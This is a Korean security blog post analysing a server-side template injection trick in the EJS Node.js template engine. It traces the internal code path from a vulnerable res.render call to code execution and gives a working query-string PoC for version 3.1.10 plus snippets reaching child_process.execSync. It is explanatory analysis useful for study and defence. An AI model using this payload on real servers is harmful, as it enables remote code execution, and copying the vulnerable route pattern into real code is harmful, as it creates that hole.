---
title: EJS SSTI Analysis
published: 2025-12-28
description: " "
tags: [Analysis]
category: Analysis
draft: false
---

웹해킹하는 사람이라면 EJS SSTI 트릭에 대해 한 번쯤 들어봤을 것이다.
25년 초반에 EJS 모듈 한 번 분석하고 CTF에서 유용하게 쓰려고 묵혀놓고 있었는데 상당히 웰노운 기법이 되어버려서 분석글을 풀어보려한다.

### About EJS
EJS(Embedded JavaScript Templates)는 Node.js 환경에서 웹을 구축할 때 보편적으로 사용되는 템플릿 엔진 중 하나이다. EJS는 HTML 문서 내에서 JavaScript 코드를 삽입하고 실행할 수 있도록 지원하는 템플릿 엔진으로, 동적인 웹 페이지를 쉽게 구성할 수 있는 장점이 있다. 그러나 이러한 유연성은 잘못된 사용 방식에 의해 보안 취약점을 초래할 위험성을 내재하고 있다. EJS 개발자들은 사용자의 입력을 확인하지 않고 render 메소드를 실행해서는 안 된다고 경고한다. 따라서 개발자가 적절한 검증 없이 사용자 입력을 받아 render 함수를 호출하면 원격 코드 실행(RCE, Remote Code Execution) 취약점이 발생할 수 있다. 이는 공격자가 악의적인 JavaScript 코드를 삽입하여 서버 측에서 실행되도록 유도할 수 있음을 의미한다.

아래는 취약한 코드의 예시이다.
```js
app.get('/', (req, res) => {
  res.render('index', req.query);
});
```

req.query 값을 그대로 `res.render()`의 2번째 인자로 넣어서 실행하는 모습이다.

---

### EJS Analysis

EJS 모듈 내부 로직을 필요한 부분만 보면, `render()`에 전달된 인자 중 첫번째 객체가 `data`로 잡힌다.

```js
if (args.length) {
  data = args.shift();
  // ...
  if (data.settings) {
    // ...
    viewOpts = data.settings['view options'];
    if (viewOpts) {
      utils.shallowCopy(opts, viewOpts);
    }
  }
}
```

여기서 포인트는 `data.settings['view options']`가 존재한다면, 그 값을 opts로 shallow copy 한다는거다.

그래서 opts에 영향을 주는 값들이 data를 통해 오염될 수 있다.

```js
function Template(text, optsParam) {
  var opts = utils.hasOwnOnlyObject(optsParam);
  var options = utils.createNullProtoObjWherePossible();
  // ...
  options.client = opts.client || false;
  options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
  // ...
}
```

```
var escapeFn = opts.escapeFunction;

if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';\n' + src;
  if (opts.compileDebug) {
    src = 'rethrow = rethrow || ' + rethrow.toString() + ';\n' + src;
  }
}
```
`opts.client`가 true라면 src에 escapeFn을 담아 실행한다.

공격자가 `view options`을 통해 client를 true로 만들고, 동시에 escapeFunction 또한 오염시킨다면 RCE가 가능하다.

과거 버전 PoC를 찾아보면 client를 건드리지 않아도 공격이 성립하지만, 최신버전에서는 client까지 오염시켜야한다.

---

### PoC (3.1.10)
```
/?settings[view options][client]=1&settings[view options][escapeFunction]=console.log(1);
```

완벽한 RCE를 구성하기 위해선 nodejs 기본 모듈인 child process를 require 해와야한다.

그러나 그냥 require을 사용하면 not defined라고 떠버리기에 아래와 같은 방법들을 사용할 수 있다.

```js
globalThis.process.mainModule.require('child_process').execSync('id');
```

```js
(async () => { try { (await import('child_process')).execSync('id'); } catch {} })();
```


